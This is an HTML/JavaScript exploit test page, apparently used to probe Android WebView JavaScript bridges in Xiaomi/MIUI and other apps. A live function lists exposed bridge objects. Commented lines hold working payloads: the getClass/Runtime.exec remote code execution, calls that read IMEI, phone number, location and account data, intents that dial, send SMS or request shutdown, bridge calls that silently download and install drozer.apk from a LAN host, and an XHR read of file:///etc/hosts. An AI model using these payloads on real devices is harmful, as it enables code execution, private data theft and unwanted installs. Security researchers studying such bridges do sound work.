<script type="text/javascript">
//var str="IMEI: "+window.JSInvoker.getImeiId();
//str+="\r\nMainUserInfo: "+window.JSInvoker.getUserSgid();
//alert(str);
//document.location.href="intent:#Intent;component=com.sogou.activity.src/com.sogou.search.profile.ADSettingActivity;end";
//alert(window.swanPreload.onJSLoaded());
// function getContents(inputStream)
// {
// 	var contents = "";
// 	var b = inputStream.read();
// 	while(b != -1) {
//     	var bString = String.fromCharCode(b);
//     	contents += bString;
//     	contents += "\n"
//     	b = inputStream.read();
// 	}
// 	return contents;
// }
 
function check() {
	var origin = ',caches,localStorage,sessionStorage,webkitStorageInfo,indexedDB,webkitIndexedDB,ondeviceorientationabsolute,ondeviceorientation,ondevicemotion,crypto,stop,open,alert,confirm,prompt,print,requestAnimationFrame,cancelAnimationFrame,requestIdleCallback,cancelIdleCallback,captureEvents,releaseEvents,getComputedStyle,matchMedia,moveTo,moveBy,resizeTo,resizeBy,getSelection,postMessage,find,blur,focus,getMatchedCSSRules,close,webkitRequestAnimationFrame,webkitCancelAnimationFrame,ontouchstart,webkitCancelRequestAnimationFrame,ontouchmove,ontouchend,ontouchcancel,btoa,onpointerup,atob,onpointerover,setTimeout,onpointerout,onpointermove,clearTimeout,onpointerleave,onpointerenter,onpointerdown,setInterval,onpointercancel,clearInterval,createImageBitmap,onorientationchange,scroll,orientation,scrollTo,scrollBy,customElements,onauxclick,performance,fetch,onunload,onunhandledrejection,console,onstorage,getContents,onrejectionhandled,onpopstate,check,onpageshow,onpagehide,ononline,onoffline,onmessage,onlanguagechange,onhashchange,onbeforeunload,onwaiting,onvolumechange,ontoggle,ontimeupdate,onsuspend,onsubmit,onstalled,onshow,onselect,onseeking,onseeked,onscroll,onresize,onreset,onratechange,onprogress,onplaying,onplay,onpause,onmousewheel,onmouseup,onmouseover,onmouseout,onmousemove,onmouseleave,onmouseenter,onmousedown,onloadstart,onloadedmetadata,onloadeddata,onload,onkeyup,onkeypress,onkeydown,oninvalid,oninput,onfocus,onerror,onended,onemptied,ondurationchange,ondrop,ondragstart,ondragover,ondragleave,ondragenter,ondragend,ondrag,ondblclick,oncuechange,oncontextmenu,onclose,onclick,onchange,oncanplaythrough,oncanplay,oncancel,onblur,onabort,isSecureContext,onwheel,onwebkittransitionend,onwebkitanimationstart,onwebkitanimationiteration,onwebkitanimationend,ontransitionend,onsearch,onanimationstart,onanimationiteration,onanimationend,styleMedia,defaultstatus,defaultStatus,screenTop,screenLeft,clientInformation,devicePixelRatio,outerHeight,outerWidth,screenY,screenX,pageYOffset,scrollY,pageXOffset,scrollX,innerHeight,innerWidth,screen,external,applicationCache,navigator,frameElement,parent,opener,top,length,frames,closed,status,toolbar,statusbar,scrollbars,personalbar,menubar,locationbar,history,location,name,document,self,window,TEMPORARY,PERSISTENT,addEventListener,removeEventListener,dispatchEvent,';
	
	var u = navigator.userAgent;
	var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1;
	isAndroid=true;
	if(!isAndroid){
		document.write('IOS:<br>');
		if(window.OCModel == undefined){
			alert('no uiwebview')
		}else{
			for (var o in window.OCModel) {
				document.write(o+':<br>');
			}
		}
		
		if(window.webkit == undefined){
			alert('no wkwebview')
		}else{
			for (var o in window.webkit.messageHandlers) {
				document.write(o+':<br>');
			}
		}					
 
		return;
	}
 
	for (var obj in window){
    	if(origin.indexOf(","+obj+",")<0){
	    	document.write(obj+':<br>');
	    	for (var o in window[obj]) {
	    		document.write('  '+o+'<br>');
	    	}
	    }
    }
 
    // document.write('<br>dangerous:<');
    // try {
    //   	if ("getClass" in window[obj]) { 
    //     	alert(obj);
    //     	try{ 
    //       		window[obj].getClass();
    //       		document.write('<b>'+obj+'</b><br>');
    //       		var p = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["id"]);
    //       		document.write(getContents(p.getInputStream())+'<br>');
    //     	}catch(e){
    //   		} 
    //   	} 
    // } catch(e) {
    // }
}
 
check();

//window.jsObj.dialPhone("88888888");
//document.location.href="http://qr.95516.com/qrcGtwWeb-web/api/pay?tn=%7B%22spId%22%3A%2211%22,%22sysProvider%22%3A%22A%22,%22orderInfo%22%3A%22a%22,%22mode%22%3A%220%22%7D";
//window.MiuiJsBridge.invoke("abc","111","222","333");
//window.RIBridge.startActivity("intent:#Intent;component=com.miui.securityadd/com.miui.child.home.kidspace.activity.PasswordSettingActivity;end");
//document.write('  getContentInfo：'+window.newHomeFollow.getContentInfo()+'<br>');
//window.newHomeFollow.longClickImage("ws://192.168.43.35:8080/a.jpg");
//document.write('  本机IMEI号：'+window.RIBridge.getImei()+'<br>');
//document.write('  本机电话号码：'+window.RIBridge.getCurrentTelNum()+'<br>');
/*var module="{'moduleTplId':1,'moduleId':1,'subItems':1,'actions':[{'actionName':'callThirdApp','actionParams':{'action':'android.intent.action.SENDTO','packageName':'com.android.mms','packageClass':'com.android.mms.ui.ComposeMessageRouterActivity','data':'sendto:88888888','extra':'sms_body:abc;phone:77777'}}]}";

module="{'moduleTplId':1,'moduleId':1,'subItems':1,'actions':[{'actionName':'callThirdApp','actionParams':{'action':'android.intent.action.CALL','packageName':'com.android.server.telecom','packageClass':'com.android.server.telecom.components.UserCallActivity','data':'tel:88888888','extra':'sms_body:abc;phone:77777'}}]}";

module="{'moduleTplId':1,'moduleId':1,'subItems':1,'actions':[{'actionName':'callThirdApp','actionParams':{'action':'com.android.internal.intent.action.REQUEST_SHUTDOWN','packageName':'com.baidu.input_mi','packageClass':'com.baidu.input.ImeUpdateActivity','data':'','extra':'name:'}}]}";

window.WE.callModule(module,"","","");
*/
//window.mp.getLocation('jsback');
//window.vipAccount.downloadApk("110732fw58fwdkr9da5gw9.rar","http://attach.bbs.miui.com/forum/201906/23/110732fw58fwdkr9da5gw9.rar");
//document.location.href="http://www.mi.com/sdcard/aaa.htm";
//setTimeout("getinfo()",50);

//document.write('getParams：'+window.quicksearchbox_api.getParams()+'<br>');

//window.mivideo.bonusEmcEvent("","mv://intentToUri?intent_to_uri=intent%3A%23Intent%3Baction%3Dcom.xiaomi.account.action.XIAOMI_ACCOUNT_WELCOME%3Bend&package_name=abc","","CLICK");
//window.mivideo.bonusEmcEvent("","mv://Intenter?package_name=org.tuzhao.ftp&app_url=http%3A%2F%2F192.168.43.35%3A8080%2Fdrozer.apk&popup=2&market_data=http%3A%2F%2F192.168.43.35%3A8080%2Fdrozer.apk%3F%26overlayPosition%3D%26senderPackageName%3Dcom.miui.video%26appId%3D464937%26packageName%3Dorg.tuzhao.ftp%26apkPaths%3D%2Fsdcard%2Fdrozer.apk%26refPosition%3D0%26extra_query_params%3D%7B%7D%26pageRef%3Dcom.miui.home%26startDownload%3Dtrue%26senderPackageName%3Dcom.xiaomi.market%26appClientId%3Dcom.xiaomi.market","","CLICK");
//window.mivideo.bonusEmcEvent("","mv://Intenter?package_name=com.xiaomi.loan&app_url=http%3A%2F%2F192.168.43.35%3A8080%2Fdrozer.apk&popup=2&market_data=http%3A%2F%2F192.168.43.35%3A8080%2Fdrozer.apk%3F%26overlayPosition%3D%26senderPackageName%3Dcom.miui.video%26appId%3D452551%26packageName%3Dcom.xiaomi.loan%26apkPaths%3D%2Fsdcard%2Fdrozer.apk%26refPosition%3D0%26extra_query_params%3D%7B%7D%26pageRef%3Dcom.miui.home%26startDownload%3Dtrue%26senderPackageName%3Dcom.xiaomi.market%26appClientId%3Dcom.xiaomi.market","","CLICK");
/*window.mivideo.getImeiId();
window.mivideo.getExtras();
window.mivideo.getRequestParams();
window.mivideo.getUserId();*/
//window.MiuiCalendar.load("{'packageName':'com.miui.securitycenter','packageClass':'com.miui.securityscan.cards.DownloadInstallReceiver','extra':'errorCode:b:string;','data':'','action':''}");
//window.mivideo.bonusEmcEvent("","mv://intentToUri?intent_to_uri=intent%3A%23Intent%3Baction%3Dmiui.intent.action.TOGGLE_TORCH%3BB.miui.intent.extra.IS_ENABLE%3Dtrue%3Bend&package_name=abc","","CLICK");
//document.location.href="duokan-reader://test?online=2";
//alert(/xss/);
//window.hiWalletCheckStatusPayAPI.startPay("a","https://click.k.jd.com@www.loteam.top/obj.htm");
//document.location.href="http://www.mi.com";
//setTimeout("opendial()",50);
function opendial(){
window.Dk.openIntentWithUri("intent:8888888#Intent;scheme=tel;end");
}
//window.Dk.getAccountUserInfo("{'msgid':'abc'}");
//document.write('getClientInfo: '+window.Dk.getClientInfo()+'<br>');
//setTimeout("recvinfo()",1000);
function recvinfo(){
    var info = window.Dk.receiveParcel("callback.");
    if(info!=""){
        document.write('getAccountUserInfo: '+info+'<br>');
    }
}
function notifyImeiId(pstr){
document.write('getImeiId: '+pstr+'<br>');
}
function notifyRequestParams(pstr){
document.write('getRequestParams: '+pstr+'<br>');
}
function notifyExtras(pstr){
document.write('getExtras: '+pstr+'<br>');
}
function notifyUserId(pstr){
document.write('getUserId: '+pstr+'<br>');
}

function jsback(str){
    document.write('  用户位置信息: '+str+'<br>');
    }
function loadXMLDoc(filepath)
{
    var arm = filepath;
    var xmlhttp;
    if (window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    xmlhttp.onreadystatechange=function()
    {
        //alert("status is"+xmlhttp.status);
        if (xmlhttp.readyState==4)
        {
              //console.log(xmlhttp.responseText);
              document.write('  FilePath: '+filepath+'<br>');
              document.write('  FileContent: '+xmlhttp.responseText+'<br>');
        }
    }
    xmlhttp.open('GET',arm);
    xmlhttp.send(null);
}
//loadXMLDoc('file:///etc/hosts');
</script>
